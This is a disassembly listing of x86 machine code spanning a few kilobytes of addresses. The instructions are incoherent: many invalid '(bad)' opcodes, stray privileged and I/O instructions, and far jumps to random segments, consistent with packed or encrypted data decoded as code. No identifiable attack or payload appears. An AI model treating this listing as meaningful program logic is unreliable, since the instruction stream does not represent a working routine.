  422881:	cwde   
  422882:	hlt    
  422883:	push   DWORD PTR [esi]
  422885:	adc    esp,DWORD PTR ds:0x6040a699
  42288b:	es jecxz 0x42281a
  42288e:	les    ebp,FWORD PTR [ebx-0x21]
  422891:	scas   eax,DWORD PTR es:[edi]
  422892:	int3   
  422893:	mov    eax,es
  422895:	inc    ebp
  422896:	xchg   ecx,eax
  422897:	xchg   ecx,eax
  422898:	out    0xff,al
  42289a:	fmul   st(3),st
  42289c:	daa    
  42289d:	mov    bh,0x4c
  42289f:	ins    BYTE PTR es:[edi],dx
  4228a0:	(bad)  
  4228a1:	pop    ss
  4228a2:	inc    BYTE PTR [edx+esi*8+0x40]
  4228a6:	cld    
  4228a7:	sbb    DWORD PTR [edi],esp
  4228a9:	sbb    eax,0x52c0541e
  4228ae:	mov    ds:0x547daccf,al
  4228b3:	pop    edi
  4228b4:	lods   al,BYTE PTR ds:[esi]
  4228b5:	lods   eax,DWORD PTR ds:[esi]
  4228b6:	ret    
  4228b7:	cmp    edx,DWORD PTR [edx+eiz*1]
  4228ba:	jbe    0x4228e9
  4228bc:	lea    esp,[edx+0x63]
  4228bf:	mov    ebp,0x598244f1
  4228c4:	sub    eax,0x1b50061a
  4228c9:	sub    DWORD PTR [eax-0x71],ebx
  4228cc:	call   0x83e8:0xcbd6505d
  4228d3:	popa   
  4228d4:	test   DWORD PTR [eax+0x52c184aa],edi
  4228da:	hlt    
  4228db:	jmp    0xf8fa:0x35be3e1f
  4228e2:	dec    edi
  4228e3:	iret   
  4228e4:	and    eax,ecx
  4228e6:	mov    ah,0xeb
  4228e8:	lods   eax,DWORD PTR ds:[esi]
  4228e9:	mov    bl,0xcd
  4228eb:	pop    eax
  4228ec:	test   ah,bl
  4228ee:	push   esp
  4228ef:	xlat   BYTE PTR ds:[ebx]
  4228f0:	inc    eax
  4228f1:	mov    bl,0xec
  4228f3:	push   ds
  4228f4:	pop    eax
  4228f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228f6:	cld    
  4228f7:	int3   
  4228f8:	jne    0x4228b7
  4228fa:	pop    ebp
  4228fb:	call   0xd8d3911c
  422900:	std    
  422901:	int    0xf4
  422903:	jmp    0xe8105eec
  422908:	push   0x4f
  42290a:	cld    
  42290b:	xor    eax,0x453f9f6
  422910:	fs leave 
  422912:	or     eax,0xa42e7cd7
  422917:	aas    
  422918:	and    eax,0x60f70924
  42291d:	fistp  WORD PTR [eax]
  42291f:	jp     0x422973
  422921:	or     cl,BYTE PTR [ebx-0x6f11314b]
  422927:	sub    eax,0x15af474d
  42292c:	mov    cs,WORD PTR [ecx]
  42292e:	fs xchg edx,eax
  422930:	ror    BYTE PTR ss:0x3112f6ab,1
  422937:	or     DWORD PTR [edi+0x433fef96],esp
  42293d:	pop    ebx
	...
  42294a:	dec    eax
  42294b:	push   eax
  42294c:	push   eax
  42294d:	dec    ebp
  42294e:	pop    eax
  42294f:	dec    ebp
  422950:	pop    ebp
  422951:	push   ebp
  422952:	stos   DWORD PTR es:[edi],eax
  422953:	mov    ch,0xf6
  422955:	stc    
  422956:	test   eax,0xac110416
  42295b:	mov    bh,0x1
  42295d:	add    BYTE PTR [esi+eax*1+0x0],bh
  422961:	add    BYTE PTR [eax-0x1e964b1d],ah
  422967:	push   eax
  422968:	xchg   ecx,eax
  422969:	and    al,0x16
  42296b:	or     al,0x78
  42296d:	aas    
  42296e:	pop    edi
  42296f:	push   ss
  422970:	pop    ecx
  422971:	in     al,0x92
  422973:	adc    DWORD PTR [edx+edi*8],0x26fdbd72
  42297a:	adc    eax,0x45546b78
  42297f:	jns    0x42291f
  422981:	stc    
  422982:	and    dh,BYTE PTR [edi+0x23941a67]
  422988:	iret   
  422989:	hlt    
  42298a:	mov    al,0x8c
  42298c:	adc    eax,0x556b6e06
  422991:	sbb    eax,0xdfabeff2
  422996:	sub    al,0x5a
  422998:	jecxz  0x4229a6
  42299a:	jno    0x4229ad
  42299c:	test   BYTE PTR [ebx-0x6e],bh
  42299f:	pop    ss
  4229a0:	cmp    dl,BYTE PTR [esi]
  4229a2:	lods   al,BYTE PTR ds:[esi]
  4229a3:	fld    QWORD PTR [ebp-0x62897771]
  4229a9:	or     BYTE PTR [eax+0x5d3b2acd],ah
  4229af:	mov    dh,0xd5
  4229b1:	stos   BYTE PTR es:[edi],al
  4229b2:	inc    ecx
  4229b3:	aaa    
  4229b4:	(bad)  
  4229b5:	ret    0xca19
  4229b8:	test   BYTE PTR [esi+0x1d],ah
  4229bb:	retf   0x78c2
  4229be:	dec    ebx
  4229bf:	adc    al,0x15
  4229c1:	xor    eax,0x32932d68
  4229c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229c7:	pop    esi
  4229c8:	pop    ecx
  4229c9:	cld    
  4229ca:	pop    edi
  4229cb:	test   cl,bl
  4229cd:	fcomi  st,st(0)
  4229cf:	icebp  
  4229d0:	mov    ecx,0x8de149de
  4229d5:	mov    ebx,0xe0ee56a4
  4229da:	(bad)  
  4229db:	jns    0x4229de
  4229dd:	test   eax,0xf99a7a6
  4229e2:	cdq    
  4229e3:	push   esi
  4229e4:	inc    ecx
  4229e5:	jmp    0xe4f6:0x8fadd7d
  4229ec:	lods   eax,DWORD PTR ds:[esi]
  4229ed:	cli    
  4229ee:	adc    dh,dh
  4229f0:	sbb    DWORD PTR [ecx+0xf99e813],0x905c23bb
  4229fa:	hlt    
  4229fb:	or     eax,0xffffff9d
  4229fe:	les    eax,FWORD PTR [eax+0xa]
  422a01:	mov    edx,fs
  422a03:	push   ebx
  422a04:	push   ds
  422a05:	pop    eax
  422a06:	loopne 0x422a05
  422a08:	sub    BYTE PTR [edi-0xb],cl
  422a0b:	mov    dl,0xc2
  422a0d:	frstpm(287 only) 
  422a0f:	sbb    DWORD PTR [ecx],ebp
  422a11:	xlat   BYTE PTR ds:[ebx]
  422a12:	std    
  422a13:	gs xchg al,bh
  422a16:	and    ebx,DWORD PTR [edi-0x1760b6c9]
  422a1c:	or     al,0x2f
  422a1e:	(bad)  
  422a1f:	jae    0x422a06
  422a21:	xor    al,0x83
  422a23:	leave  
  422a24:	fs jb  0x422a92
  422a27:	sub    eax,0x46605c33
  422a2c:	loopne 0x422a02
  422a2e:	sub    dh,BYTE PTR [edx+ebx*4]
  422a31:	fcomp  QWORD PTR [esi+0x7b]
  422a34:	sbb    al,0x76
  422a36:	xor    BYTE PTR [esi+0x66],cl
  422a39:	mov    bl,0xe6
  422a3b:	adc    ebx,DWORD PTR [ebx]
  422a3d:	pop    edx
  422a3e:	adc    esp,ebp
  422a40:	xor    al,0x20
  422a42:	xor    DWORD PTR [esi+0xe],esp
  422a45:	sbb    dh,BYTE PTR [ecx+eax*1]
  422a48:	xor    edi,DWORD PTR [ebp+0x3c3fe6ba]
  422a4e:	fs push esi
  422a50:	adc    ch,0xe7
  422a53:	or     BYTE PTR [eax],bh
  422a55:	dec    edx
  422a56:	pop    ecx
  422a57:	sub    dh,BYTE PTR [edx-0x70]
  422a5a:	push   0x6c
  422a5c:	(bad)  
  422a5d:	leave  
  422a5e:	rcr    BYTE PTR [ebx+0xbc5f56d],cl
  422a64:	jmp    0x97e0:0x7149d65e
  422a6b:	dec    esi
  422a6c:	stc    
  422a6d:	fwait
  422a6e:	mov    ebx,0xb1b97038
  422a73:	xchg   edx,eax
  422a74:	bound  esi,QWORD PTR [esi-0x58bb379f]
  422a7a:	jp     0x422aa0
  422a7c:	push   cs
  422a7d:	mov    esi,0x3287c93d
  422a82:	int3   
  422a83:	push   eax
  422a84:	mov    BYTE PTR [ebx-0x4b],al
  422a87:	inc    eax
  422a88:	cli    
  422a89:	cmp    al,0xb8
  422a8b:	test   al,0xbd
  422a8d:	xchg   DWORD PTR [esi],eax
  422a8f:	bound  edx,QWORD PTR [eax+eax*1-0x6a8cf234]
  422a96:	shr    DWORD PTR [edx-0x4e815cf6],cl
  422a9c:	and    edi,DWORD PTR [eax]
  422a9e:	loopne 0x422b09
  422aa0:	pop    esi
  422aa1:	cmp    al,0x43
  422aa3:	mov    bl,0xe1
  422aa5:	push   cs
  422aa6:	sub    ebp,DWORD PTR ds:0xadb64712
  422aac:	mov    ch,BYTE PTR [ebp+0xfdd3a27]
  422ab2:	outs   dx,BYTE PTR ds:[esi]
  422ab3:	push   ds
  422ab4:	popa   
  422ab5:	xchg   esp,eax
  422ab6:	jmp    0x422a59
  422ab8:	sbb    cl,bh
  422aba:	rol    ebx,0x54
  422abd:	pop    ebp
  422abe:	jecxz  0x422afa
  422ac0:	gs jmp 0x1c40b73
  422ac6:	(bad)  
  422ac7:	fnsave [eax-0x6f]
  422aca:	popf   
  422acb:	in     al,dx
  422acc:	xchg   ecx,eax
  422acd:	in     eax,dx
  422ace:	push   es
  422acf:	add    eax,0x625087cd
  422ad4:	loopne 0x422b31
  422ad6:	mov    esi,0x6f7717e0
  422adb:	mov    dl,0x17
  422add:	repz add ah,0xf2
  422ae1:	pop    ebp
  422ae2:	ins    DWORD PTR es:[edi],dx
  422ae3:	pop    ebp
  422ae4:	and    DWORD PTR [esi+0x68794768],ecx
  422aea:	inc    eax
  422aeb:	icebp  
  422aec:	or     ch,BYTE PTR [edi]
  422aee:	outs   dx,BYTE PTR ds:[esi]
  422aef:	push   ebx
  422af0:	adc    DWORD PTR [ecx+0x36],esp
  422af3:	mov    ds:0x15b26223,eax
  422af8:	xchg   edx,eax
  422af9:	cs out 0xd8,eax
  422afc:	dec    esi
  422afd:	ds jecxz 0x422ae5
  422b00:	enter  0xee80,0x95
  422b04:	xchg   DWORD PTR [ebx+edi*2-0x2b],ecx
  422b08:	mov    ebx,0x88b8eb79
  422b0d:	dec    edx
  422b0e:	ins    BYTE PTR es:[edi],dx
  422b0f:	fdivr  QWORD PTR [eax]
  422b11:	dec    eax
  422b12:	sbb    al,0x84
  422b14:	sahf   
  422b15:	inc    esp
  422b16:	(bad)  
  422b17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b18:	xor    cl,0xb9
  422b1b:	inc    eax
  422b1c:	ficomp DWORD PTR [edx]
  422b1e:	mov    BYTE PTR [ecx],bh
  422b20:	dec    eax
  422b21:	or     esp,DWORD PTR [edx]
  422b23:	sub    bh,dh
  422b25:	test   eax,0x9cd29ae2
  422b2a:	shl    ch,1
  422b2c:	pop    edx
  422b2d:	shl    al,0xc9
  422b30:	or     esi,esi
  422b32:	pop    esp
  422b33:	iret   
  422b34:	clc    
  422b35:	(bad)  
  422b36:	repnz in eax,dx
  422b38:	cli    
  422b39:	cli    
  422b3a:	test   al,0x70
  422b3c:	inc    edx
  422b3d:	(bad)  
  422b3f:	xor    al,0xad
  422b41:	jns    0x422ae6
  422b43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b44:	xlat   BYTE PTR ds:[ebx]
  422b45:	push   esi
  422b46:	push   cs
  422b47:	xor    esi,DWORD PTR [esi+ecx*4-0x7424956]
  422b4e:	xor    DWORD PTR [eax],0xffffffdf
  422b51:	fdivp  st(2),st
  422b53:	rcl    BYTE PTR [eax],1
  422b55:	scas   eax,DWORD PTR es:[edi]
  422b56:	or     eax,0xd0489dcc
  422b5b:	cmp    BYTE PTR [esp+ecx*1+0x1af3a8ea],bh
  422b62:	add    al,ah
  422b64:	jne    0x422bb2
  422b66:	jg     0x422be5
  422b68:	outs   dx,BYTE PTR ds:[esi]
  422b69:	icebp  
  422b6a:	stos   BYTE PTR es:[edi],al
  422b6b:	push   ebp
  422b6c:	imul   ecx,esi,0xffffffcf
  422b6f:	jns    0x422b57
  422b71:	sbb    bl,dh
  422b73:	icebp  
  422b74:	stc    
  422b75:	test   DWORD PTR [esp+eax*8],edi
  422b78:	adc    eax,DWORD PTR ds:0x6edded51
  422b7e:	pop    eax
  422b7f:	ret    0x6cfd
  422b82:	lods   eax,DWORD PTR ds:[esi]
  422b83:	sbb    DWORD PTR [ebx+0x41d59170],esi
  422b89:	xor    dh,0x52
  422b8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b8d:	inc    edi
  422b8e:	out    dx,al
  422b8f:	test   eax,0x222f1dfe
  422b94:	jnp    0x422bf2
  422b96:	xor    DWORD PTR [esi-0x6d51b57b],0xffffffde
  422b9d:	or     DWORD PTR [ebp+0x73],edi
  422ba0:	push   esi
  422ba1:	and    DWORD PTR [ebx-0x566d964c],ebp
  422ba7:	imul   ebp,DWORD PTR [eax-0x2281d507],0x7e118ae0
  422bb1:	ins    BYTE PTR es:[edi],dx
  422bb2:	sahf   
  422bb3:	shl    BYTE PTR es:[ebp-0x44fd27b0],1
  422bba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bbb:	(bad)  
  422bbc:	call   0xb24d:0xc9cf4dee
  422bc3:	aad    0xf6
  422bc5:	cmp    BYTE PTR ds:0xae33b2cc,dh
  422bcb:	rcl    DWORD PTR [esi-0x5a],1
  422bce:	mov    cl,0x96
  422bd0:	call   0x5d636451
  422bd5:	xor    eax,0x8a32b691
  422bda:	ins    DWORD PTR es:[edi],dx
  422bdb:	dec    esi
  422bdc:	ss xchg ebp,eax
  422bde:	daa    
  422bdf:	sub    BYTE PTR [edx],al
  422be1:	fnstcw WORD PTR [eax-0x55]
  422be4:	scas   al,BYTE PTR es:[edi]
  422be5:	dec    ecx
  422be6:	and    eax,0x8286508d
  422beb:	add    eax,0x3ca1c48b
  422bf0:	or     edi,ecx
  422bf2:	cmp    al,0x57
  422bf4:	out    0x51,al
  422bf6:	jmp    0xc5dae0af
  422bfb:	and    dh,BYTE PTR [edi]
  422bfd:	dec    ecx
  422bfe:	ret    
  422bff:	push   cs
  422c00:	xor    bl,0x8d
  422c03:	push   0x2441aac8
  422c08:	fimul  DWORD PTR [eax-0x39]
  422c0b:	loopne 0x422bea
  422c0d:	retf   
  422c0e:	fild   DWORD PTR [ecx]
  422c10:	adc    BYTE PTR ds:0x9318d0c4,dl
  422c16:	and    dh,BYTE PTR [ecx*2-0x933857d]
  422c1d:	retf   0x8d28
  422c20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c21:	and    al,0x37
  422c23:	lods   al,BYTE PTR ds:[esi]
  422c24:	sbb    bh,cl
  422c26:	fdiv   DWORD PTR [ecx]
  422c28:	push   esi
  422c29:	push   eax
  422c2a:	sbb    BYTE PTR [ebx-0x3854e413],dh
  422c30:	test   edi,0xde99ff39
  422c36:	repz es push 0x93285c62
  422c3d:	pushf  
  422c3e:	push   0x51
  422c40:	mov    cl,0x95
  422c42:	mov    al,ds:0xb2072d81
  422c47:	lahf   
  422c48:	ins    BYTE PTR es:[edi],dx
  422c49:	inc    eax
  422c4a:	aad    0x84
  422c4c:	shl    BYTE PTR [ecx],cl
  422c4e:	(bad)  
  422c4f:	into   
  422c50:	mov    edx,0xc7a2f3b2
  422c55:	fnstcw WORD PTR [eax-0x74c1f26c]
  422c5b:	jns    0x422c81
  422c5d:	cmc    
  422c5e:	and    esi,edi
  422c60:	call   edx
  422c62:	mov    al,0xcf
  422c64:	xor    al,0xfb
  422c66:	mov    dh,0xd2
  422c68:	(bad)  [ecx]
  422c6a:	scas   eax,DWORD PTR es:[edi]
  422c6b:	push   eax
  422c6c:	stos   BYTE PTR es:[edi],al
  422c6d:	xor    eax,DWORD PTR [esi-0x5a9cfbb0]
  422c73:	add    DWORD PTR [ebp-0x68],edx
  422c76:	pop    edi
  422c77:	or     bl,ah
  422c79:	dec    edi
  422c7a:	call   0xbebd:0x2bfec31d
  422c81:	das    
  422c82:	add    DWORD PTR [ebx+0x45bf4a3a],edi
  422c88:	add    ebp,esi
  422c8a:	jo     0x422cc7
  422c8c:	jg     0x422c4b
  422c8e:	add    al,bh
  422c90:	xchg   ecx,eax
  422c91:	push   cs
  422c92:	sub    al,0x10
  422c94:	mov    eax,ds:0x8649f48e
  422c99:	pop    es
  422c9a:	mov    ebx,0x1180d7bc
  422c9f:	in     eax,0xaf
  422ca1:	ja     0x422c72
  422ca3:	outs   dx,DWORD PTR ds:[esi]
  422ca4:	or     bl,BYTE PTR [ebx-0x2b]
  422ca7:	in     al,dx
  422ca8:	pop    ds
  422ca9:	jno    0x422c68
  422cab:	mov    ebp,0x201c1a6
  422cb0:	sbb    eax,DWORD PTR [ebx-0x2678317e]
  422cb6:	fsub   QWORD PTR [edx+0x48b109f9]
  422cbc:	inc    ecx
  422cbd:	push   ebx
  422cbe:	jmp    0x414c8f9a
  422cc3:	mov    ebx,0xc42c2cee
  422cc8:	sbb    eax,0xc2a4bbce
  422ccd:	jb     0x422cf0
  422ccf:	fucomip st,st(1)
  422cd1:	mov    edx,0x4ecee126
  422cd6:	loopne 0x422ce9
  422cd8:	jne    0x422d32
  422cda:	outs   dx,DWORD PTR ds:[esi]
  422cdb:	ret    0xd8ad
  422cde:	push   edx
  422cdf:	rcr    BYTE PTR [eax-0x26acc694],0x25
  422ce6:	pop    esp
  422ce7:	mov    edx,0xa6bc7474
  422cec:	jno    0x422d23
  422cee:	or     DWORD PTR [edi-0x37],ebp
  422cf1:	in     al,dx
  422cf2:	push   esi
  422cf3:	test   al,0xe6
  422cf5:	test   eax,0xc8fffde6
  422cfa:	stc    
  422cfb:	xchg   esi,eax
  422cfc:	mov    esp,edi
  422cfe:	das    
  422cff:	and    DWORD PTR [ebx],0x17ce62de
  422d05:	jae    0x422d0d
  422d07:	cmp    cl,BYTE PTR [eax+0xf]
  422d0a:	cmp    BYTE PTR [edx+0x3b],bh
  422d0d:	push   ebp
  422d0e:	jl     0x422d68
  422d10:	inc    ebx
  422d11:	cmp    al,BYTE PTR [edi+0x0]
  422d14:	cmp    eax,0xb40660d
  422d19:	mov    cl,0x0
  422d1b:	cmp    DWORD PTR [ecx-0x7b913ac6],eax
  422d21:	sub    al,0x11
  422d23:	inc    edi
  422d24:	add    BYTE PTR [edx+0x23a947e9],bl
  422d2a:	cwde   
  422d2b:	repz pop ebp
  422d2d:	shl    BYTE PTR [eax+eax*4-0x47],0x76
  422d32:	xor    al,0x59
  422d34:	sub    eax,0x20f090ed
  422d39:	adc    dl,BYTE PTR [edi+ebp*8]
  422d3c:	repnz gs sbb eax,0x31cc028b
  422d43:	popf   
  422d44:	lock rcr BYTE PTR [ecx+edx*8],0xa
  422d49:	inc    ecx
  422d4a:	(bad)  
  422d4c:	mov    ds:0xe5a38b28,al
  422d51:	push   edx
  422d52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d53:	inc    ebx
  422d54:	push   ebx
  422d55:	enter  0x10ad,0x40
  422d59:	mov    dh,0x8b
  422d5b:	stos   BYTE PTR es:[edi],al
  422d5c:	test   eax,0x575c0f35
  422d61:	jp     0x422d5d
  422d63:	and    DWORD PTR [esi],edx
  422d65:	icebp  
  422d66:	jle    0x422d00
  422d68:	lds    esp,FWORD PTR [edi-0xd]
  422d6b:	jmp    0x1711890d
  422d70:	jl     0x422d70
  422d72:	shl    BYTE PTR ds:0xde66cfbe,1
  422d78:	push   esi
  422d79:	and    esi,DWORD PTR [ebx-0x51]
  422d7c:	test   edx,esi
  422d7e:	leave  
  422d7f:	jge    0x422dc6
  422d81:	inc    edx
  422d82:	arpl   cx,di
  422d84:	call   0xd741d695
  422d89:	push   edi
  422d8a:	cli    
  422d8b:	inc    esp
  422d8c:	mov    ah,0x7f
  422d8e:	mov    esi,0xfd175288
  422d93:	ss retf 0x953f
  422d97:	push   ss
  422d98:	scas   al,BYTE PTR es:[edi]
  422d99:	pop    es
  422d9a:	in     al,0xc7
  422d9c:	pop    edi
  422d9d:	sbb    ah,BYTE PTR [edx+0x69966a2f]
  422da3:	sub    dl,BYTE PTR [ecx]
  422da5:	add    eax,0xbf98812
  422daa:	pop    esp
  422dab:	lods   al,BYTE PTR ds:[esi]
  422dac:	aaa    
  422dad:	arpl   WORD PTR [ebx-0x3cd053d1],ax
  422db3:	pop    ds
  422db4:	and    eax,DWORD PTR [edx]
  422db6:	pop    esi
  422db7:	inc    esp
  422db8:	lods   al,BYTE PTR ds:[esi]
  422db9:	shl    BYTE PTR [eax],1
  422dbb:	push   edi
  422dbc:	hlt    
  422dbd:	das    
  422dbe:	scas   al,BYTE PTR es:[edi]
  422dbf:	adc    BYTE PTR [esi+0x1e],dh
  422dc2:	icebp  
  422dc3:	pop    es
  422dc4:	mov    dl,BYTE PTR [edi+0x13764115]
  422dca:	enter  0x2628,0x49
  422dce:	adc    eax,0xd5f57002
  422dd3:	jecxz  0x422dbb
  422dd5:	(bad)  
  422dd6:	xchg   ebp,eax
  422dd7:	sub    al,0x41
  422dd9:	mov    BYTE PTR [edx+eiz*1+0x1a1389],al
  422de0:	mov    ds:0x14db942d,eax
  422de5:	jns    0x422d8f
  422de7:	dec    esp
  422de8:	ss icebp 
  422dea:	xchg   edx,eax
  422deb:	ret    0x11f
  422dee:	push   edi
  422def:	push   ecx
  422df0:	inc    esi
  422df1:	imul   edx,DWORD PTR [edi+0x1e],0x10df4a59
  422df8:	adc    BYTE PTR [edi],dl
  422dfa:	(bad)  
  422dfb:	(bad)  
  422dfc:	dec    eax
  422dfd:	cmp    dl,0x76
  422e00:	pusha  
  422e01:	in     al,dx
  422e02:	or     BYTE PTR [ecx+0x2f],al
  422e05:	ficomp DWORD PTR [ebx]
  422e07:	ret    0x2c02
  422e0a:	add    dh,bh
  422e0c:	(bad)  [edx-0x17bcd453]
  422e12:	sub    al,0x15
  422e14:	nop
  422e15:	arpl   WORD PTR [ebp-0x69c6892a],di
  422e1b:	andps  xmm7,xmm5
  422e1e:	bound  eax,QWORD PTR [edi+0x915cce6]
  422e24:	push   0x2f
  422e26:	add    DWORD PTR [eax+0x4],esp
  422e29:	cdq    
  422e2a:	mov    WORD PTR [esp+ecx*1-0x43],fs
  422e2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e2f:	mov    dh,0x12
  422e31:	xchg   DWORD PTR ss:[edi+0x76a140a9],esp
  422e38:	sbb    DWORD PTR [esi-0x45aab889],ecx
  422e3e:	das    
  422e3f:	mov    edi,0x87ab2d47
  422e44:	into   
  422e45:	jle    0x422dcc
  422e47:	mov    esi,0xd77b197a
  422e4c:	push   0xb07bc277
  422e51:	sbb    ecx,DWORD PTR [ebp+eiz*2-0x32557b]
  422e58:	inc    ebx
  422e59:	imul   edx,DWORD PTR [ecx-0x6785da63],0x6ff86171
  422e63:	sub    eax,0xde6cc293
  422e68:	data16 mov bl,0x72
  422e6b:	mov    ebx,0x12e1c63e
  422e70:	mov    al,0x19
  422e72:	dec    edi
  422e73:	push   esi
  422e74:	mov    bl,0xce
  422e76:	cmp    al,0x8e
  422e78:	push   edi
  422e79:	lahf   
  422e7a:	xchg   BYTE PTR [ecx-0x6a649aa4],dh
  422e80:	adc    BYTE PTR [ecx+0x2ff9b93d],0xb8
  422e87:	xlat   BYTE PTR ds:[ebx]
  422e88:	add    al,0xfc
  422e8a:	jmp    0x8aa0:0xe60d756f
  422e91:	(bad)  [edi-0x6f]
  422e94:	adc    bl,dh
  422e96:	xor    dh,dl
  422e98:	push   edx
  422e99:	addr16 push edx
  422e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e9d:	ss nop
  422e9f:	dec    edi
  422ea0:	rcr    esp,0xe8
  422ea3:	imul   ebp,DWORD PTR [ebx+0x5e],0xfffffff6
  422ea7:	jecxz  0x422e7b
  422ea9:	pusha  
  422eaa:	and    eax,0x9217584d
  422eaf:	push   ss
  422eb0:	mov    bh,0x7d
  422eb2:	rcl    DWORD PTR [ebx],0xc1
  422eb5:	push   0xffffff86
  422eb7:	jns    0x422e7a
  422eb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422eba:	adc    edi,edi
  422ebc:	test   al,0xee
  422ebe:	outs   dx,BYTE PTR ds:[esi]
  422ebf:	enter  0x50cf,0x69
  422ec3:	add    DWORD PTR [edx],esi
  422ec5:	add    esp,DWORD PTR [ebp-0x57]
  422ec8:	mov    ds:0xd81d0842,al
  422ecd:	sti    
  422ece:	xchg   esp,eax
  422ecf:	mov    dl,0xe0
  422ed1:	or     DWORD PTR [ecx],ebx
  422ed3:	or     edx,DWORD PTR [edx+ebp*4+0x46]
  422ed7:	dec    edi
  422ed8:	jns    0x422f13
  422eda:	inc    edx
  422edb:	and    eax,0x95a1b312
  422ee0:	xchg   ebp,eax
  422ee1:	xor    eax,0x5b4e7c22
  422ee6:	out    0xd4,al
  422ee8:	fst    DWORD PTR [esi]
  422eea:	mov    ds:0x4fb5ecfa,eax
  422eef:	int    0x78
  422ef1:	loopne 0x422f29
  422ef3:	bound  ebx,QWORD PTR [edi]
  422ef5:	fistp  WORD PTR [eax+eax*8]
  422ef8:	pushf  
  422ef9:	cmp    BYTE PTR [ebx-0x3],0xb3
  422efd:	lds    ecx,FWORD PTR [eax]
  422eff:	push   ebp
  422f00:	jp     0x422ed3
  422f02:	mov    ds:0xd54c2df8,al
  422f07:	(bad)  
  422f09:	adc    esp,ecx
  422f0b:	frstor [edi-0x145fc687]
  422f11:	pop    esp
  422f12:	das    
  422f13:	sar    DWORD PTR [ebp+eiz*8-0x17c7b765],cl
  422f1a:	std    
  422f1b:	cmc    
  422f1c:	mov    esp,0x7919c0c4
  422f21:	(bad)  
  422f22:	test   al,bl
  422f24:	mov    ds:0x47e8fe7f,eax
  422f29:	push   0xc
  422f2b:	cdq    
  422f2c:	test   BYTE PTR [eax+0xa],ah
  422f2f:	push   ebp
  422f30:	mov    ecx,0xa0c546ca
  422f35:	dec    eax
  422f36:	inc    ebp
  422f37:	mov    bl,0xf9
  422f39:	and    al,0x67
  422f3b:	lahf   
  422f3c:	ins    BYTE PTR es:[edi],dx
  422f3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f3e:	mov    ecx,0x832f6c68
  422f43:	inc    edx
  422f44:	xchg   BYTE PTR [edx+0x45e95cab],ah
  422f4a:	lds    ax,DWORD PTR [eax]
  422f4d:	rol    BYTE PTR [edx],cl
  422f4f:	and    al,0x6c
  422f51:	daa    
  422f52:	xchg   edi,eax
  422f53:	(bad)  
  422f54:	retf   0xc4e3
  422f57:	int    0xd6
  422f59:	into   
  422f5a:	es sahf 
  422f5c:	mov    al,0x66
  422f5e:	cmp    DWORD PTR ds:0x74a96b58,0x29
  422f65:	ret    0xe534
  422f68:	je     0x422fbb
  422f6a:	ret    0x179e
  422f6d:	sub    ebx,edi
  422f6f:	addr16 leave 
  422f71:	out    dx,al
  422f72:	and    ecx,DWORD PTR [ecx+0x4f86a7ad]
  422f78:	pop    edx
  422f79:	xlat   BYTE PTR ds:[ebx]
  422f7a:	xchg   dl,ch
  422f7c:	mul    DWORD PTR [esi]
  422f7e:	add    DWORD PTR [eax],esp
  422f80:	mov    dh,0xca
  422f82:	pushf  
  422f83:	push   0x66
  422f85:	push   ebx
  422f86:	or     ebp,ecx
  422f88:	pusha  
  422f89:	xchg   esp,eax
  422f8a:	mov    ebp,0xccf53fab
  422f8f:	out    dx,al
  422f90:	cmp    eax,0xba35ec04
  422f95:	inc    edx
  422f96:	jmp    0xc792:0xa2f4fc39
  422f9d:	xchg   dl,bh
  422f9f:	lea    esi,[edi-0x34]
  422fa2:	mov    eax,ds:0x2db21d3
  422fa7:	imul   eax,DWORD PTR [edi+0x17],0xbaf21571
  422fae:	sub    BYTE PTR [edx],dh
  422fb0:	jl     0x422f3a
  422fb2:	fcmovbe st,st(4)
  422fb4:	add    BYTE PTR [ebx],ch
  422fb6:	loop   0x422fdd
  422fb8:	mov    esp,0xda4df399
  422fbd:	repz mov al,ds:0x25419f04
  422fc3:	pop    eax
  422fc4:	lods   eax,DWORD PTR ds:[esi]
  422fc5:	nop
  422fc6:	cmp    ch,BYTE PTR [eax-0x45940c10]
  422fcc:	mul    DWORD PTR [ebx]
  422fce:	clc    
  422fcf:	pop    edi
  422fd0:	mov    cl,0xa0
  422fd2:	xor    DWORD PTR [edx],0x72e965b1
  422fd8:	mov    ecx,0x7658d2e6
  422fdd:	add    DWORD PTR [eax],eax
	...
  422fe7:	add    BYTE PTR [eax],al
  422fe9:	add    BYTE PTR [eax+0x4e],dl
  422fec:	dec    edi
  422fed:	push   esi
  422fee:	pop    edi
  422fef:	push   edi
  422ff0:	pop    ecx
  422ff1:	dec    esi
  422ff2:	idiv   BYTE PTR [ebx+0x53]
  422ff5:	jns    0x423009
  422ff7:	push   ss
  422ff8:	push   ecx
  422ff9:	ja     0x423023
  422ffb:	mov    esi,0x67c0001
  423000:	add    BYTE PTR [eax],al
  423002:	repz add BYTE PTR [ecx],dl
  423005:	pop    es
  423006:	(bad)  
  423007:	mov    ebx,0xba172846
  42300c:	retf   
  42300d:	or     ch,BYTE PTR [ecx]
  42300f:	add    eax,0x7e55c415
  423014:	adc    ah,BYTE PTR [esi]
  423016:	enter  0xcce8,0xf8
  42301a:	dec    edi
  42301b:	mov    dh,0xb0
  42301d:	jns    0x423043
  42301f:	test   eax,0xc64e5e77
  423024:	(bad)
  423029:	cli    
  42302a:	add    al,0x82
  42302c:	push   ds
  42302d:	push   ebp
  42302e:	loope  0x42305d
  423030:	adc    al,0x9
  423032:	or     bl,BYTE PTR [esi-0x25e5e5b7]
  423038:	jnp    0x423078
  42303a:	das    
  42303b:	mov    dl,0xfd
  42303d:	(bad)  
  42303e:	sti    
  42303f:	push   ebp
  423040:	in     al,0xf3
  423042:	loope  0x42300f
  423044:	jne    0x42309b
  423046:	mov    WORD PTR [eax+0x68],?
  423049:	sbb    al,0x1e
  42304b:	adc    al,BYTE PTR [esi-0x39]
  42304e:	jl     0x422fee
  423050:	inc    ebx
  423051:	sub    al,0x64
